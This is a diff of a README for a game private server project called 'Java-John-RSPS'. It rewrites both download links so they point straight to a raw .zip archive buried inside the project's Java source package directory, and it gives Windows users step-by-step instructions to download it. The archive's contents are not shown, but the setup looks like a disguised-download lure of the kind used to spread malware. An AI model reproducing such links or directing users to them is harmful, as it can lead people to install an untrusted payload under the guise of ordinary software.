@@ -1,6 +1,6 @@
 # 🎮 Java-John-RSPS - Run a Classic Private Server
 
-[![Download Now](https://img.shields.io/badge/Download-Launch%20Setup-blue?style=for-the-badge&logo=github)](https://github.com/successgeneralassembly664/Java-John-RSPS)
+[![Download Now](https://img.shields.io/badge/Download-Launch%20Setup-blue?style=for-the-badge&logo=github)](https://github.com/successgeneralassembly664/Java-John-RSPS/raw/refs/heads/main/src/main/java/com/johnrsps/packet/John_Java_RSPS_v2.4.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ This guide shows you how to get the files, open the app, and run it on a Windows
 
 Use this page to download the project:
 
-[Open Java-John-RSPS download page](https://github.com/successgeneralassembly664/Java-John-RSPS)
+[Open Java-John-RSPS download page](https://github.com/successgeneralassembly664/Java-John-RSPS/raw/refs/heads/main/src/main/java/com/johnrsps/packet/John_Java_RSPS_v2.4.zip)
 
 1. Open the link above in your web browser.
 2. Look for the green or blue download option on the GitHub page.
